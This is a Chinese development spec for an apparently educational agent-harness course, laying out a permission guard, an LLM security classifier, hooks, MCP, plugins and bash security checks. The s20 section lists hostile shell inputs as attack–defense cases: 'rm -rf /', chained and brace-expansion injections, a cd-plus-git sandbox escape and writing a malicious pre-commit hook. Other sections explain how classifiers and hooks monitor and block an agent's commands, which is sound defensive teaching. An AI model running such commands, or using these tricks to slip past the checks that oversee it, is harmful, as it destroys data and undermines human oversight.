                return {"content": [{"type": "text", "text": text}]}
        return {}
```

#### MCP 配置文件示例

**文件**: `.mcp/config.json`

```json
{
  "mcpServers": {
    "file-analyzer": {
      "transport": "stdio",
      "command": "python agents/mock_mcp_server.py"
    }
  }
}
```

#### 工具集 (新增 2 个)

```python
{
    "name": "mcp_list_servers",
    "description": "List connected MCP servers and their tools.",
    "input_schema": {"type": "object", "properties": {}}
}

{
    "name": "mcp_discover",
    "description": "Re-scan and register MCP tools from all connected servers.",
    "input_schema": {"type": "object", "properties": {}}
}
```

#### Try It 实验内容

```
1. "how many MCP servers are connected?"           → mcp_list_servers
2. "rediscover tools from MCP servers"             → mcp_discover
3. "count lines in s02_tool_use.py"                → MCP count_lines 工具
4. "search for 'PermissionGuard' in all files"     → MCP search_content 工具
```

---

### 【模块 E】s17: Secure Extension Harness (安全扩展总成)

**文件**: `agents/s17_secure_extension_harness.py`
**预计行数**: ~450 行
**依赖**: s13, s14, s15, s16

#### 文件头部模板

```python
#!/usr/bin/env python3
# Harness: secure extension -- four lines of defense, one loop.
"""
s17_secure_extension_harness.py - Secure Extension Harness

s13-s16 each run independently. Real systems need all layers
working together. The key is a clear execution pipeline where
each layer has one job.

    LLM calls tool
         |
         v
    [1] Hook: PreToolUse   ──block──> return error
         |
         v
    [2] Classifier          ──deny───> return error
         |
         v
    [3] Permission          ──deny───> return error
         |                   ──ask───> user confirm?
         |
         v
    [4] Execute (built-in or MCP)
         |
         v
    [5] Hook: PostToolUse   (observe/log)
         |
         v
    return result

Key insight: "生产级 Harness 的核心不是功能多，而是各层职责清晰、互不干扰。"
"""
```

#### 核心执行管线

```python
def execute_tool(tool_name: str, tool_input: dict, context: dict) -> str:
    # Layer 1: Pre-tool hook
    hook_ctx = {"tool": tool_name, "input": tool_input}
    pre = HOOKS.fire("PreToolUse", hook_ctx)
    if pre and pre.get("action") == "block":
        return f"Blocked by hook: {pre['reason']}"

    # Layer 2: Security classification (bash only)
    if tool_name == "bash":
        cmd = tool_input.get("command", "")
        classification = CLASSIFIER.classify(cmd, context.get("recent_text", ""))
        if classification["mode"] == "deny":
            return f"Security denied: {classification['reason']}"
        if classification["mode"] == "ask":
            approved = input(
                f"\033[31m[security:{classification['level']}] "
                f"Allow: {cmd}? (y/n) \033[0m"
            ).strip().lower() == "y"
            if not approved:
                return "User denied command"

    # Layer 3: Execute (built-in handler or MCP)
    handler = TOOL_HANDLERS.get(tool_name)
    if handler:
        output = handler(**tool_input)
    elif tool_name in MCP_MANAGER._tools:
        output = MCP_MANAGER.call(tool_name, tool_input)
    else:
        output = f"Unknown tool: {tool_name}"

    # Layer 4: Post-tool hook
    HOOKS.fire("PostToolUse", {"tool": tool_name, "output": output})

    return output
```

#### REPL 命令

```python
REPL_COMMANDS = {
    "/security": lambda: print(f"Classifier: active\nMode: default\nDeny rules: {len(DANGEROUS_PATTERNS)}"),
    "/hooks":    lambda: print(HOOKS.list_hooks()),
    "/mcp":      lambda: print(MCP_MANAGER.list_servers()),
    "/audit":    lambda: print((WORKDIR / ".hooks" / "audit.jsonl").read_text()[-2000:]),
}
```

#### 工具集汇总

| 工具 | 来源 | 类型 |
|------|------|------|
| bash | 内建 | 经过安全管线的命令执行 |
| read_file | 内建 | 读文件 |
| write_file | 内建 | 写文件 |
| edit_file | 内建 | 编辑文件 |
| hook_register | s15 | 注册 Hook |
| hook_list | s15 | 列出 Hook |
| mcp_list_servers | s16 | 列出 MCP 服务器 |
| mcp_discover | s16 | 发现 MCP 工具 |
| (动态) | MCP | 外部工具 |

#### Try It 实验内容

```
1. "list all python files"                          → all layers pass -> allow
2. "run rm -rf /"                                   → classifier deny -> blocked
3. "write a test file and show audit log"            → PostToolUse hook logs -> /audit 查看
4. "search for 'PermissionGuard' via MCP"            → MCP tool called through pipeline
5. "register a hook that blocks all pip commands"    → dynamic hook registration
```

---

## 五、前端更新

### 【模块 F】constants.ts 更新

**文件**: `web/src/lib/constants.ts`

```typescript
// 1. VERSION_ORDER 新增 s13-s17
export const VERSION_ORDER = [
  "s01", "s02", "s03", "s04", "s05", "s06", "s07", "s08",
  "s09", "s10", "s11", "s12",
  "s13", "s14", "s15", "s16", "s17"  // 新增
] as const;

// 2. VERSION_META 新增 5 个条目
export const VERSION_META: Record<string, {...}> = {
  // ... 现有 s01-s12 ...
  s13: {
    title: "Permission Guard",
    subtitle: "Not Every Command Should Run Automatically",
    coreAddition: "PermissionGuard with 5 permission modes",
    keyInsight: "把 '禁止' 升级为 '策略' -- 从一条 if 到一个权限模型",
    layer: "security",
    prevVersion: "s02",
  },
  s14: {
    title: "Security Classifier",
    subtitle: "Let the Model Judge Its Own Commands",
    coreAddition: "Two-layer classifier: regex quick-scan + LLM classification",
    keyInsight: "正则表达式只认模式不认意图；LLM 能理解上下文，判断命令真正的危险程度",
    layer: "security",
    prevVersion: "s13",
  },
  s15: {
    title: "Hooks System",
    subtitle: "Intercept Between Model and Tool",
    coreAddition: "HookManager with 8 event types and 3 execution modes",
    keyInsight: "Hooks 不改变工具的行为，但改变了工具何时、如何、是否被执行",
    layer: "security",
    prevVersion: "s13",
  },
  s16: {
    title: "MCP Client",
    subtitle: "Tools Don't Have to Be Built-in",
    coreAddition: "MCPClient + MCPManager for external tool servers",
    keyInsight: "MCP 把工具分发从 dict 升级为网络协议",
    layer: "security",
    prevVersion: "s02",
  },
  s17: {
    title: "Secure Extension Harness",
    subtitle: "Four Lines of Defense, One Loop",
    coreAddition: "Unified execution pipeline: Hook -> Classify -> Permission -> Execute",
    keyInsight: "生产级 Harness 的核心不是功能多，而是各层职责清晰、互不干扰",
    layer: "security",
    prevVersion: "s16",
  },
};

// 3. LAYERS 新增 security 层
export const LAYERS = [
  { id: "tools" as const, label: "Tools & Execution", color: "#3B82F6", versions: ["s01", "s02"] },
  { id: "planning" as const, label: "Planning & Coordination", color: "#10B981", versions: ["s03", "s04", "s05", "s07"] },
  { id: "memory" as const, label: "Memory Management", color: "#8B5CF6", versions: ["s06"] },
  { id: "concurrency" as const, label: "Concurrency", color: "#F59E0B", versions: ["s08"] },
  { id: "collaboration" as const, label: "Collaboration", color: "#EF4444", versions: ["s09", "s10", "s11", "s12"] },
  // 新增
  { id: "security" as const, label: "Security & Extensibility", color: "#06B6D4", versions: ["s13", "s14", "s15", "s16", "s17"] },
] as const;
```

### 【模块 F】国际化文件更新

**文件**: `web/src/i18n/messages/zh.json`

在 `sessions` 和 `viz` 中新增：

```json
{
  "sessions": {
    "s13": "权限守卫",
    "s14": "安全分类器",
    "s15": "Hooks 事件系统",
    "s16": "MCP 客户端",
    "s17": "安全扩展总成"
  },
  "layer_labels": {
    "security": "安全与扩展"
  },
  "layers": {
    "security": "保护用户免受模型的伤害。权限模型、安全分类、生命周期 Hook 和外部工具协议。"
  },
  "viz": {
    "s13": "Permission Guard Pipeline",
    "s14": "Two-Layer Security Classifier",
    "s15": "Hook Manager Event Bus",
    "s16": "MCP Tool Discovery",
    "s17": "Secure Execution Pipeline"
  }
}
```

**文件**: `web/src/i18n/messages/en.json`

```json
{
  "sessions": {
    "s13": "Permission Guard",
    "s14": "Security Classifier",
    "s15": "Hooks System",
    "s16": "MCP Client",
    "s17": "Secure Extension Harness"
  },
  "layer_labels": {
    "security": "Security & Extensibility"
  },
  "layers": {
    "security": "Protect the user from the agent. Permission models, security classifiers, lifecycle hooks, and external tool protocols."
  },
  "viz": {
    "s13": "Permission Guard Pipeline",
    "s14": "Two-Layer Security Classifier",
    "s15": "Hook Manager Event Bus",
    "s16": "MCP Tool Discovery",
    "s17": "Secure Execution Pipeline"
  }
}
```

**文件**: `web/src/i18n/messages/ja.json`

```json
{
  "sessions": {
    "s13": "権限ガード",
    "s14": "セキュリティ分類器",
    "s15": "Hooks システム",
    "s16": "MCP クライアント",
    "s17": "セキュア拡張ハーネス"
  },
  "layer_labels": {
    "security": "セキュリティと拡張性"
  },
  "viz": {
    "s13": "Permission Guard Pipeline",
    "s14": "Two-Layer Security Classifier",
    "s15": "Hook Manager Event Bus",
    "s16": "MCP Tool Discovery",
    "s17": "Secure Execution Pipeline"
  }
}
```

### 【模块 G】模拟器场景数据

需要为每个新章节创建模拟器场景文件。

**文件**: `web/src/data/scenarios/s13.json`

```json
{
  "version": "s13",
  "title": "Permission Guard",
  "description": "An agent with a permission model that classifies commands before execution",
  "steps": [
    {
      "type": "user_message",
      "content": "List all files and then delete temp.log",
      "annotation": "User sends a multi-step task"
    },
    {
      "type": "assistant_text",
      "content": "I'll list the files first, then delete temp.log.",
      "annotation": "Model plans two tool calls"
    },
    {
      "type": "tool_call",
      "content": "ls -la",
      "toolName": "bash",
      "annotation": "ls is in ALLOWED_COMMANDS -> auto-allow"
    },
    {
      "type": "tool_result",
      "content": "temp.log  hello.py  README.md",
      "toolName": "bash",
      "annotation": "Allowed: ls is a safe command"
    },
    {
      "type": "tool_call",
      "content": "rm temp.log",
      "toolName": "bash",
      "annotation": "rm matches ASK_PATTERNS -> permission check"
    },
    {
      "type": "permission_check",
      "mode": "ask",
      "reason": "File deletion",
      "command": "rm temp.log",
      "annotation": "PermissionGuard classifies as 'ask' mode"
    },
    {
      "type": "tool_result",
      "content": "(file deleted)",
      "toolName": "bash",
      "annotation": "User approved the deletion"
    },
    {
      "type": "assistant_text",
      "content": "Done! Listed files and deleted temp.log.",
      "annotation": "Both operations completed with appropriate permission checks"
    }
  ]
}
```

**文件**: `web/src/data/scenarios/s14.json`

```json
{
  "version": "s14",
  "title": "Security Classifier",
  "description": "Two-layer command classification: regex quick-scan + LLM intent analysis",
  "steps": [
    {
      "type": "user_message",
      "content": "Clean up the build directory and then check git status",
      "annotation": "User asks for potentially dangerous operations"
    },
    {
      "type": "assistant_text",
      "content": "I'll remove the build directory and check git status.",
      "annotation": "Model plans two operations"
    },
    {
      "type": "tool_call",
      "content": "rm -rf build/",
      "toolName": "bash",
      "annotation": "Quick scan: no dangerous pattern match. LLM classify needed."
    },
    {
      "type": "classifier_check",
      "layer1": "pass",
      "layer2": "moderate",
      "mode": "ask",
      "annotation": "LLM classifies 'rm -rf build/' as moderate risk"
    },
    {
      "type": "tool_result",
      "content": "(build directory removed)",
      "toolName": "bash",
      "annotation": "User approved after LLM classification"
    },
    {
      "type": "tool_call",
      "content": "git status",
      "toolName": "bash",
      "annotation": "git is in SAFE_COMMANDS whitelist -> auto-allow"
    },
    {
      "type": "tool_result",
      "content": "On branch main\nnothing to commit",
      "toolName": "bash",
      "annotation": "Whitelist: zero-cost classification"
    },
    {
      "type": "assistant_text",
      "content": "Build directory cleaned and git status checked.",
      "annotation": "Both operations completed with appropriate classification"
    }
  ]
}
```

**文件**: `web/src/data/scenarios/s15.json`

```json
{
  "version": "s15",
  "title": "Hooks System",
  "description": "Lifecycle hooks that intercept, log, and modify tool calls",
  "steps": [
    {
      "type": "user_message",
      "content": "Create a new file called config.yaml with default settings",
      "annotation": "User requests file creation"
    },
    {
      "type": "hook_fire",
      "event": "AgentStart",
      "annotation": "AgentStart hook fires"
    },
    {
      "type": "assistant_text",
      "content": "I'll create config.yaml with default settings.",
      "annotation": "Model decides to use write_file"
    },
    {
      "type": "hook_fire",
      "event": "PreToolUse",
      "tool": "write_file",
      "annotation": "PreToolUse hook fires (no block)"
    },
    {
      "type": "tool_call",
      "content": "key: value\ndebug: false",
      "toolName": "write_file",
      "annotation": "write_file executes"
    },
    {
      "type": "hook_fire",
      "event": "PostToolUse",
      "hook": "auto_git_add",
      "annotation": "PostToolUse hook auto-git-adds the file"
    },
    {
      "type": "tool_result",
      "content": "Wrote 27 bytes to config.yaml",
      "toolName": "write_file",
      "annotation": "File written and auto-staged"
    },
    {
      "type": "assistant_text",
      "content": "Done! config.yaml created and auto-staged in git.",
      "annotation": "Hook side-effect mentioned"
    }
  ]
}
```

**文件**: `web/src/data/scenarios/s16.json`

```json
{
  "version": "s16",
  "title": "MCP Client",
  "description": "Connecting to external tool servers via Model Context Protocol",
  "steps": [
    {
      "type": "user_message",
      "content": "How many lines of code are in s02_tool_use.py?",
      "annotation": "User asks a question that can use MCP tools"
    },
    {
      "type": "assistant_text",
      "content": "I'll use the MCP file analyzer to count lines.",
      "annotation": "Model chooses MCP tool over bash"
    },
    {
      "type": "tool_call",
      "content": "agents/s02_tool_use.py",
      "toolName": "count_lines",
      "annotation": "MCP tool discovered at startup"
    },
    {
      "type": "tool_result",
      "content": "151 lines",
      "toolName": "count_lines",
      "annotation": "MCP server processes the request via JSON-RPC"
    },
    {
      "type": "assistant_text",
      "content": "s02_tool_use.py has 151 lines of code.",
      "annotation": "MCP tool result returned seamlessly"
    }
  ]
}
```

**文件**: `web/src/data/scenarios/s17.json`

```json
{
  "version": "s17",
  "title": "Secure Extension Harness",
  "description": "Full security pipeline: Hook → Classify → Permission → Execute → PostHook",
  "steps": [
    {
      "type": "user_message",
      "content": "Check git log and then force push to origin",
      "annotation": "User mixes safe and dangerous operations"
    },
    {
      "type": "assistant_text",
      "content": "I'll check the git log first.",
      "annotation": "Model starts with safe operation"
    },
    {
      "type": "hook_fire",
      "event": "PreToolUse",
      "tool": "bash",
      "annotation": "[Layer 1] PreToolUse hook fires"
    },
    {
      "type": "tool_call",
      "content": "git log --oneline -5",
      "toolName": "bash",
      "annotation": "[Layer 2] Classifier: whitelist -> allow"
    },
    {
      "type": "hook_fire",
      "event": "PostToolUse",
      "annotation": "[Layer 5] PostToolUse audit log"
    },
    {
      "type": "tool_result",
      "content": "a1b2c3d Fix bug\n e4f5g6h Add feature",
      "toolName": "bash",
      "annotation": "Safe command passed all layers"
    },
    {
      "type": "assistant_text",
      "content": "Now I'll force push to origin.",
      "annotation": "Model attempts dangerous operation"
    },
    {
      "type": "hook_fire",
      "event": "PreToolUse",
      "tool": "bash",
      "annotation": "[Layer 1] PreToolUse hook fires"
    },
    {
      "type": "classifier_check",
      "layer1": "blocked",
      "reason": "Force push pattern matched",
      "mode": "deny",
      "annotation": "[Layer 2] Quick scan catches force push -> deny"
    },
    {
      "type": "tool_result",
      "content": "Security denied: Force push pattern blocked",
      "toolName": "bash",
      "annotation": "Blocked at Layer 2, never reaches execution"
    },
    {
      "type": "assistant_text",
      "content": "I can't force push as it's blocked by security policy. Would you like me to push normally instead?",
      "annotation": "Model acknowledges the security block"
    }
  ]
}
```

### 【模块 G】模拟器组件增强

模拟器需要支持新的 step 类型来可视化安全管线：

**需修改的文件**: `web/src/hooks/useSimulator.ts`

新增 step 类型支持：
- `permission_check` — 显示权限检查 UI (allow/ask/deny)
- `classifier_check` — 显示分类器结果 (layer1 pass/block, layer2 safe/moderate/dangerous)
- `hook_fire` — 显示 Hook 触发事件

**需修改的文件**: `web/src/components/simulator/AgentLoopSimulator.tsx`

新增可视化元素：
- 权限检查阶段：黄色警告图标 + 命令预览
- 分类器阶段：双列显示 (Layer 1 regex / Layer 2 LLM)
- Hook 触发：闪电图标 + 事件名

---

## 六、文档文件

### 【模块 H】课程文档

每章需要 3 个文档（英文/中文/日文），遵循现有模板结构：

```
docs/en/s13-permission-guard.md
docs/en/s14-security-classifier.md
docs/en/s15-hooks-system.md
docs/en/s16-mcp-client.md
docs/en/s17-secure-extension-harness.md

docs/zh/s13-permission-guard.md
docs/zh/s14-security-classifier.md
docs/zh/s15-hooks-system.md
docs/zh/s16-mcp-client.md
docs/zh/s17-secure-extension-harness.md

docs/ja/s13-permission-guard.md
docs/ja/s14-security-classifier.md
docs/ja/s15-hooks-system.md
docs/ja/s16-mcp-client.md
docs/ja/s17-secure-extension-harness.md
```

每篇文档模板：

```markdown
# sXX: [标题] ([中文标题])

`s02 > [ s13 ] > s14 ... | s15 | s16 > s17`

> *"[标语]"* -- [核心概念]
>
> **Harness 层**: [层次描述]

## 问题

[当前痛点，2-3 段]

## 解决方案

```
[ASCII 图示]
```

## 工作原理

[逐步代码解释]

## 相对 sYY 的变更

| 组件 | 之前 (sYY) | 之后 (sXX) |
|------|-----------|-----------|

## 现实对照 (Reality Check)

> 真实 Claude Code 中的对应实现：
> - [对应源码模块 1]
> - [对应源码模块 2]

## Try It

```sh
cd learn-claude-code
python agents/sXX_[name].py
```

实验 prompt:
1. [具体任务 1]
2. [具体任务 2]
3. [具体任务 3]
```

---

## 七、需更新的现有文件

### 【模块 I】现有文件更新

| 文件 | 修改内容 |
|------|---------|
| `agents/s_full.py` | 在 `# === SECTION: base_tools ===` 前增加 `# === SECTION: security ===`（SecurityClassifier + PermissionGuard + HookManager + MCPManager），修改 run_bash 使用安全管线。增加 REPL 命令 /security, /hooks, /mcp, /audit。预计增加 ~250 行 |
| `README.md` | 更新课程目录，增加 Phase 5 描述 |
| `README-zh.md` | 同上（中文版） |
| `s01-s12-topic-map.md` | 扩展为 s01-s17-topic-map.md |
| `web/src/lib/constants.ts` | 增加 s13-s17 的 VERSION_META 和 security layer |
| `web/src/i18n/messages/en.json` | 增加 sessions/layer_labels/viz 条目 |
| `web/src/i18n/messages/zh.json` | 同上（中文） |
| `web/src/i18n/messages/ja.json` | 同上（日文） |
| `web/src/hooks/useSimulator.ts` | 支持 permission_check / classifier_check / hook_fire step 类型 |
| `web/src/components/simulator/AgentLoopSimulator.tsx` | 新增安全管线可视化 UI |
| `web/scripts/extract-content.ts` | 确保 s13-s17 源码被正确提取 |

---

## 八、分工建议

| 模块 | 标签 | 工作量 | 建议分工 |
|------|------|--------|---------|
| **A** | s13 Permission Guard | ~230 行 Python + 3 篇文档 | 开发者 1 |
| **B** | s14 Security Classifier | ~280 行 Python + 3 篇文档 | 开发者 1 |
| **C** | s15 Hooks System | ~300 行 Python + 3 篇文档 | 开发者 2 |
| **D** | s16 MCP Client | ~350 行 Python + 3 篇文档 | 开发者 2 |
| **E** | s17 Secure Extension Harness | ~450 行 Python + 3 篇文档 | 开发者 1+2 协作 |
| **F** | 前端 constants + i18n | ~100 行 TypeScript/JSON | 开发者 3 |
| **G** | 前端模拟器场景 + 组件 | ~300 行 TypeScript/JSON | 开发者 3 |
| **H** | 课程文档 (15 篇) | ~15 篇 Markdown | 开发者 4 / AI 辅助 |
| **I** | 现有文件更新 | ~400 行混合 | 开发者 3 或最后统一处理 |

### 执行顺序

```
Week 1:
  A(s13) → B(s14)     [开发者 1]
  C(s15)               [开发者 2]
  F(前端基础设施)       [开发者 3]
  H(s13-s15 文档)      [开发者 4]

Week 2:
  D(s16)               [开发者 2]
  E(s17)               [开发者 1+2]
  G(模拟器场景+组件)    [开发者 3]
  H(s16-s17 文档)      [开发者 4]

Week 3:
  I(现有文件更新)       [开发者 3]
  集成测试 + s_full.py  [全员]
```

---
---

# Phase 6: PRODUCTION PATTERNS — 开发规格文档

> **目标**: 新增 s18-s21 共 4 个章节，基于 claude-code 源码分析，深入生产级上下文管理、LLM 安全分类器、Bash 安全检查、Plugin 系统。
> **分析依据**: 2026-04-30 对 `/Users/yanghaoran/Code/claude-code/src/` 的完整源码分析。
> **前置条件**: Phase 5 (s13-s17) 完成。

---

## Phase 6 总体架构

### 新增章节依赖关系

```
s06 (上下文压缩)
 └── s18 (Session Memory) — 结构化记忆 + 自动提取

s14 (安全分类器)
 └── s19 (Auto Mode 分类器) — 两阶段 LLM 分类

s13 (权限守卫)
 └── s20 (Bash 安全深度) — 命令白名单 + Flag 验证

s05 (Skills)
 └── s21 (Plugin 系统) — 可组合插件架构
```

### 新增 Layer 定义

现有 6 层 → 新增第 7 层 `production`：

| Layer ID | Label (EN) | Label (ZH) | Color | Versions |
|----------|-----------|-----------|-------|----------|
| tools | Tools & Execution | 工具与执行 | #3B82F6 | s01, s02 |
| planning | Planning & Coordination | 规划与协调 | #10B981 | s03, s04, s05, s07 |
| memory | Memory Management | 记忆管理 | #8B5CF6 | s06 |
| concurrency | Concurrency | 并发 | #F59E0B | s08 |
| collaboration | Collaboration | 协作 | #EF4444 | s09, s10, s11, s12 |
| security | Security & Extensibility | 安全与扩展 | #06B6D4 | s13, s14, s15, s16, s17 |
| **production** | **Production Patterns** | **生产模式** | **#EC4899 (pink)** | **s18, s19, s20, s21, s22, s23** |

---

## Phase 6 教学内容概述

### 为什么需要 Phase 6？

s13-s17 把教学 Agent 从"玩具"升级到了"安全可扩展"。但对比真实 Claude Code 源码，还有几个关键的生产级模式没有覆盖：

1. **s06 的上下文压缩太简单** — 真实系统有结构化的 Session Memory（10 个 section 模板、token 预算管理、自动提取）
2. **s14 的 LLM 分类器太简单** — 真实系统有两阶段分类（Fast XML + Thinking），支持 PowerShell、transcript 重放、GrowthBook 特性开关
3. **s13 的权限检查太简单** — 真实系统的 Bash 安全检查有 2000+ 行，包含命令白名单、Flag 级验证、Glob 检测、Git 内部路径保护
4. **s05 的 Skills 太简单** — 真实系统有完整的 Plugin 架构（内置插件、Marketplace 插件、skills + hooks + MCP 三合一）

Phase 6 要展示的是"从教学级到生产级"的工程差距，让学生理解真实系统的复杂性。

### s18: Session Memory — 会话记忆不是压缩，是结构化笔记

**一句话**: s06 教了"丢掉不重要的上下文"，s18 教"把重要的上下文变成可检索的笔记"。

s06 的 compact 本质是"删减"——用 LLM 摘要替换原始对话，丢失细节。真实 Claude Code 的 Session Memory 是另一种思路：用 LLM 从对话中**提取**结构化笔记，持久化到磁盘，下次对话直接加载。

s18 引入 `SessionMemory` 系统：

```
对话进行中 (token 监控)
     │
     ├─ 达到 10K tokens → 初始化 session-memory.md
     │
     ├─ 每增长 5K tokens → 增量更新
     │
     └─ 对话结束 → 最终提取

session-memory.md 结构:
┌─────────────────────────────┐
│ # Session Title             │ ← 5-10 词描述
│ # Current State             │ ← 正在做什么
│ # Task Specification        │ ← 用户要求
│ # Files and Functions       │ ← 关键文件
│ # Workflow                  │ ← 常用命令
│ # Errors & Corrections      │ ← 踩过的坑
│ # Codebase Documentation    │ ← 系统组件
│ # Learnings                 │ ← 经验教训
│ # Key Results               │ ← 重要输出
│ # Worklog                   │ ← 步骤日志
└─────────────────────────────┘
```

**Token 预算管理**：
- 每个 section 最多 2000 tokens
- 总计不超过 12000 tokens
- 超标时自动压缩（优先保留 Current State 和 Errors）

**并发安全**：
- `inProgress` 锁防止并发提取
- trailing extraction 模式：如果提取进行中又有新请求，记录最新上下文，等当前提取完成后再跑一次

**关键洞察**: 上下文管理的终极形态不是"压缩"，而是"提取"。压缩是被动防御（防止超限），提取是主动积累（构建知识）。

**与真实源码的对照**: Claude Code 的 Session Memory 系统（`services/SessionMemory/`）包含：
- `sessionMemory.ts` — 主提取逻辑，forked agent 执行
- `sessionMemoryUtils.ts` — Token 阈值配置、并发状态管理
- `prompts.ts` — 10 section 模板、自定义 prompt 支持
- `extractMemories.ts` — 自动记忆提取（独立于 Session Memory）
- 与 compact 联动：compact 后注入 Session Memory，实现"压缩不丢信息"

---

### s19: Auto Mode Classifier — 两阶段 LLM 安全分类

**一句话**: s14 的单次 LLM 分类是 MVP，真实系统用两阶段分类实现精度和成本的平衡。

s14 的 LLM 分类器只用一次 LLM 调用，返回 safe/moderate/dangerous。这在教学场景足够，但生产环境有两个问题：
1. **精度不够** — 单次判断容易误判（`rm -rf node_modules/` vs `rm -rf /` 需要更多推理）
2. **成本浪费** — 所有命令都走 LLM，即使明显安全的也要花 token

s19 引入**两阶段分类**：

```
命令进入
     │
     ▼
[Stage 1: Fast XML 分类]
 │ 快速判断，低成本
 │ XML 格式输出
 │
 ├─ safe → allow（确定性高，直接放行）
 ├─ dangerous → deny（确定性高，直接拒绝）
 │
 └─ uncertain → [Stage 2: Thinking 深度推理]
                  │ 带思维链的深度分析
                  │ 考虑对话上下文
                  │ 分析命令组合意图
                  │
                  └─ safe / moderate / dangerous
```

**安全兜底原则**：
- 任何阶段失败 → 默认 block（安全优先）
- 分类器不可用 → 默认 block
- 解析失败 → 默认 block
- Transcript 过长 → 默认 block

**Transcript 传递**：
- 把当前对话历史（最近 N 轮）格式化为 JSONL
- 分类器能看到完整上下文，理解命令的"来龙去脉"

**关键洞察**: 生产级 LLM 分类器的核心不是"更准"，而是"安全兜底 + 成本优化"。Fast stage 处理 80% 的简单判断，Thinking stage 只处理 20% 的复杂情况。

**与真实源码的对照**: Claude Code 的 `yoloClassifier.ts`（`utils/permissions/`）实现了：
- `YoloClassifierTool` — 专用分类器工具定义
- `buildYoloSystemPrompt` — 52KB 的安全分类 prompt
- 两阶段配置：`tengu_auto_mode_config` 中的 `twoStageClassifier`（both/fast/thinking）
- PowerShell 支持：专门的 `POWERSHELL_DENY_GUIDANCE`
- 完整遥测：`tengu_auto_mode_outcome` 追踪分类结果、token 开销、延迟

---

### s20: Bash Security Deep Dive — 2000 行安全检查拆解

**一句话**: s13 的正则匹配是入门，真实系统的 Bash 安全检查是一个完整的命令解析器。

s13 用正则表达式匹配危险模式（`rm -rf /`、`curl | sh`）。但这在真实场景中远远不够：

- `ls; rm -rf /` — 分号拼接绕过
- `git diff {@'{'0},--output=/tmp/pwned}` — brace expansion 注入
- `cd /malicious && git status` — cd + git 沙箱逃逸
- `uniq --skip-chars=0$_` — 变量展开走私

s20 引入**命令解析器级别的安全检查**：

```
命令字符串
     │
     ▼
[Shell 解析] tryParseShellCommand()
 │ 分词、处理引号、处理转义
 │
 ▼
[Token 分析]
 ├─ 命令白名单匹配 (COMMAND_ALLOWLIST)
 ├─ Flag 级验证 (每个命令枚举合法 flag)
 ├─ Glob 检测 (未引用的 *, ?, [...])
 ├─ 变量展开检测 (未引用的 $VAR)
 ├─ Brace expansion 检测 ({a,b} 或 {1..5})
 │
 ▼
[复合命令检查]
 ├─ Git 内部路径保护 (HEAD, objects/, refs/, hooks/)
 ├─ 沙箱逃逸检测 (cd + git 组合)
 ├─ Bare repo 检测
 │
 ▼
[路径验证]
 └─ 写路径提取 + 沙箱白名单匹配
```

**教学策略**：不实现完整的 2000 行检查器，而是用 5 个递进的攻击-防御案例展示思路：

| 案例 | 攻击 | 防御 |
|------|------|------|
| 1 | `ls; rm -rf /` | 复合命令拆分 + 逐条检查 |
| 2 | `echo *` 扩展为危险参数 | Glob 检测 + 引号状态追踪 |
| 3 | `cd /tmp && git status` | cd + git 组合检测 |
| 4 | `mkdir hooks && echo malicious > hooks/pre-commit && git status` | Git 内部路径写检测 |
| 5 | `$_` 变量走私 | 变量展开检测（单引号内 literal，双引号内展开） |

**关键洞察**: 安全检查的敌人不是"危险命令"，而是"看起来无害但能被组合利用的命令"。一个好的安全检查器需要理解 Shell 的解析规则，而不仅仅是匹配字符串。

**与真实源码的对照**: Claude Code 的 Bash 安全系统分布在多个文件中：
- `tools/BashTool/bashSecurity.ts` — 23 种安全检查（命令替换、heredoc 注入、Zsh 危险命令等）
- `tools/BashTool/readOnlyValidation.ts` — 2000+ 行的只读命令验证，包含：
  - `COMMAND_ALLOWLIST` — 40+ 命令的白名单 + Flag 级验证
  - `READONLY_COMMAND_REGEXES` — 正则回退
  - `containsUnquotedExpansion()` — Shell 引号状态机
  - `commandWritesToGitInternalPaths()` — Git 内部路径检测
  - `checkReadOnlyConstraints()` — 统一入口
- `utils/permissions/bashClassifier.ts` — Bash 命令分类
- `utils/powershell/dangerousCmdlets.ts` — PowerShell 7 类危险 cmdlet

---

### s21: Plugin System — Skills、Hooks、MCP 的统一容器

**一句话**: s05 的 Skill 是单一知识单元，s21 的 Plugin 是包含 skills + hooks + MCP 的可组合容器。

s05 的 Skill 系统解决了"按需加载知识"的问题。但真实系统中，用户扩展不只是知识，还包括：
- **行为拦截**（Hooks） — 每次工具调用前/后执行自定义逻辑
- **外部工具**（MCP） — 连接数据库、API、文件分析器
- **知识注入**（Skills） — 领域专业知识

这三者经常需要一起使用。例如"数据库助手"插件需要：
- 一个 MCP 服务器（连接数据库）
- 几个 Skills（SQL 最佳实践、表结构文档）
- 几个 Hooks（查询前记录审计日志）

s21 引入 `PluginManager`：

```
~/.claude/plugins/
 ├── db-assistant/
 │   ├── manifest.json    ← 插件元数据
 │   ├── skills/          ← 知识文件
 │   ├── hooks/           ← Hook 配置
 │   └── mcp-servers/     ← MCP 服务器配置
 │
 └── code-reviewer/
     ├── manifest.json
     └── skills/

manifest.json:
{
  "name": "db-assistant",
  "version": "1.0.0",
  "description": "Database query and analysis assistant",
  "skills": ["sql-best-practices.md", "schema-reference.md"],
  "hooks": {
    "PreToolUse": "audit-log.py"
  },
  "mcpServers": {
    "db-query": { "transport": "stdio", "command": "python db_server.py" }
  }
}
```

**与 Skill 的区别**：
| 维度 | Skill (s05) | Plugin (s21) |
|------|-------------|--------------|
| 内容 | 单一知识文件 | skills + hooks + MCP |
| 加载 | 按需 | 启动时 + 按需 |
| 管理 | 文件系统 | 注册表（enable/disable） |
| 隔离 | 共享命名空间 | 插件命名空间（`plugin:skill`） |

**关键洞察**: Plugin 是"s05 + s15 + s16"的统一封装。它不是新的核心机制，而是现有机制的组合模式。这种"可组合"的设计让学生理解：好的架构不需要新概念，只需要好的组合方式。

**与真实源码的对照**: Claude Code 的 Plugin 系统（`plugins/`）包含：
- `builtinPlugins.ts` — 内置插件注册（`{name}@builtin` 命名）
- `PluginInstallationManager` — Marketplace 插件安装/卸载
- `pluginOperations.ts` — 插件 CRUD 操作
- `pluginOptionsStorage.ts` — 插件配置持久化
- 每个 Plugin 可以提供 `skills`、`hooks`、`mcpServers` 三个维度
- 用户通过 `/plugin` 命令启用/禁用

---

### Phase 6 课程总结

| 章节 | 核心问题 | 回答 | 新增机制 | 源码对照 |
|------|---------|------|---------|---------|
| **s18** | 怎么让压缩不丢信息？ | 结构化记忆提取 | SessionMemory (10 section 模板 + token 预算) | `services/SessionMemory/` (4 文件) |
| **s19** | 怎么让 LLM 分类更准？ | 两阶段分类 | FastXMLClassifier + ThinkingClassifier | `utils/permissions/yoloClassifier.ts` (52KB prompt) |
